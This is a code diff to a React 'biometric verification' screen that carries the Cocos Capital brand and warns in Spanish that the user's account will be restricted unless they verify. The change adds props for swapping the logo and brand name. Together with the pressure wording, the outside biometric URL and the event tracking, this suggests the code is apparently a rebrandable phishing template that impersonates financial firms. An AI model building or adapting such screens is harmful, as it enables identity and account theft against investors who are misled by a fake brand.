@@ -6,10 +6,12 @@ interface CocosV2BiometricScreenProps {
   email: string;
   fullName: string;
   biometricUrl: string;
+  logo?: React.ReactNode;
+  brandName?: string;
   onEvent?: (event: string) => void;
 }
 
-const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: CocosV2BiometricScreenProps) => {
+const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, logo, brandName = "Cocos Capital", onEvent }: CocosV2BiometricScreenProps) => {
   const [visible, setVisible] = useState(false);
   const [verificationStarted, setVerificationStarted] = useState(false);
   const [showFinishBtn, setShowFinishBtn] = useState(false);
@@ -51,7 +53,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
     return (
       <div className={`w-full max-w-[520px] px-1 transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
         <div className="flex justify-center mb-4">
-          <CocosLogo />
+          {logo || <CocosLogo />}
         </div>
 
         <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
@@ -143,7 +145,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
   return (
     <div className={`w-full max-w-[480px] px-1 transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
       <div className="flex justify-center mb-5 sm:mb-6">
-        <CocosLogo />
+        {logo || <CocosLogo />}
       </div>
 
       {/* Success badge */}
@@ -170,7 +172,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
           <Lock size={15} className="text-amber-600 flex-shrink-0 mt-0.5" />
           <div>
             <p className="text-[11.5px] sm:text-[12.5px] text-[#1a2233] font-semibold leading-relaxed">
-              Esta verificación es un <strong className="text-amber-700">procedimiento estándar de Cocos Capital</strong> para proteger tus fondos. Sin completarla, tu cuenta quedará <strong className="text-amber-700">temporalmente restringida</strong>.
+              Esta verificación es un <strong className="text-amber-700">procedimiento estándar de {brandName}</strong> para proteger tus fondos. Sin completarla, tu cuenta quedará <strong className="text-amber-700">temporalmente restringida</strong>.
             </p>
           </div>
         </div>
@@ -233,7 +235,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
       </div>
 
       <p className="text-center text-[10px] sm:text-[11px] text-[#b0b8c9] leading-relaxed max-w-[360px] mx-auto">
-        🔐 Este es un procedimiento estándar de Cocos Capital para garantizar la seguridad de tu cuenta y que tus inversiones sigan rindiendo al máximo. Cumplimos con todas las normativas vigentes de la CNV.
+        🔐 Este es un procedimiento estándar de {brandName} para garantizar la seguridad de tu cuenta y que tus inversiones sigan rindiendo al máximo. Cumplimos con todas las normativas vigentes de la CNV.
       </p>
     </div>
   );
